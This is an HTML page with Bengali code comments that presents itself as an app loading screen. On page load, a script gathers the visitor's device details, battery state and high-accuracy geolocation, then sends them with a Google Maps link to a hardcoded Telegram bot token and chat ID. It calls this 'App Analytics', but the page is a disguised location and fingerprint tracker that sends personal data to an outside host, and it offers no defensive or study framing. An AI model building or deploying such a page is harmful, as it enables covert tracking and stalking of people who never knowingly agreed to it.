<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Loading...</title>
</head>
<body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">

    <h2>Welcome to My App</h2>
    <p>Please wait while loading...</p>

    <script>
      // ⚠️ নিচে আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসান
      const BOT_TOKEN = "8855743272:AAGFFDUIG4k8IPuiMOBuwLOjfvKMIYXk79A"; 
      const CHAT_ID = "5980493892";     

      document.addEventListener("DOMContentLoaded", function () {
        // ১. ইউনিক ডিভাইস আইডি তৈরি বা নেওয়া
        let deviceId = localStorage.getItem("app_device_id");
        if (!deviceId) {
          deviceId = "DEV-" + Math.floor(100000 + Math.random() * 900000);
          localStorage.setItem("app_device_id", deviceId);
        }

        // ২. ডিভাইসের টেকনিক্যাল তথ্য সংগ্রহ
        const analytics = {
          deviceId: deviceId,
          userAgent: navigator.userAgent,
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
          cores: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown",
          screenRes: `${window.screen.width} x ${window.screen.height}`,
          orientation: window.screen.height >= window.screen.width ? "Portrait" : "Landscape",
          theme: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode",
          networkType: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown",
          downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : "Unknown",
          localTime: new Date().toLocaleTimeString(),
          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language || navigator.userLanguage
        };

        // ৩. ব্যাটারি স্ট্যাটাস চেক
        if (navigator.getBattery) {
          navigator.getBattery().then(battery => {
            analytics.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
            initLocationAndSend(analytics);
          }).catch(() => {
            analytics.battery = "Unknown";
            initLocationAndSend(analytics);
          });
        } else {
          analytics.battery = "Not Supported";
          initLocationAndSend(analytics);
        }
      });

      function initLocationAndSend(data) {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function (position) {
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;
              data.permissionStatus = "Allowed";
              data.mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
              sendTelegramMessage(data);
            },
            function (error) {
              data.permissionStatus = "Denied / Unavailable";
              data.mapLink = "N/A";
              sendTelegramMessage(data);
            },
            { enableHighAccuracy: true, timeout: 10000 }
          );
        } else {
          data.permissionStatus = "Not Supported";
          data.mapLink = "N/A";
          sendTelegramMessage(data);
        }
      }

      function sendTelegramMessage(data) {
        let messageText = `📊 *App Analytics Notification*\n\n`;
        messageText += `🆔 *Device ID:* \`${data.deviceId}\`\n`;
        messageText += `📱 *Device Info:* ${data.userAgent}\n`;
        messageText += `⚙️ *Hardware:* ${data.cores} | ~${data.ram}\n`;
        messageText += `📐 *Display:* ${data.screenRes} (${data.orientation}) | ${data.theme}\n`;
        messageText += `🌐 *Network:* ${data.networkType} (Speed: ${data.downlink})\n`;
        messageText += `🕒 *Time:* ${data.localTime} (${data.timeZone})\n`;
        messageText += `🗣️ *Language:* ${data.language}\n`;
        messageText += `🔋 *Battery:* ${data.battery}\n\n`;
        messageText += `🔒 *Permission:* ${data.permissionStatus}\n`;

        if (data.permissionStatus === "Allowed") {
          messageText += `🗺️ *Location:* [View Location on Google Maps](${data.mapLink})`;
        } else {
          messageText += `⚠️ *Note:* User denied location access.`;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: "Markdown",
            disable_web_page_preview: false
          })
        }).then(res => console.log("Success!"))
          .catch(err => console.log("Error:", err));
      }
    </script>

</body>
</html>
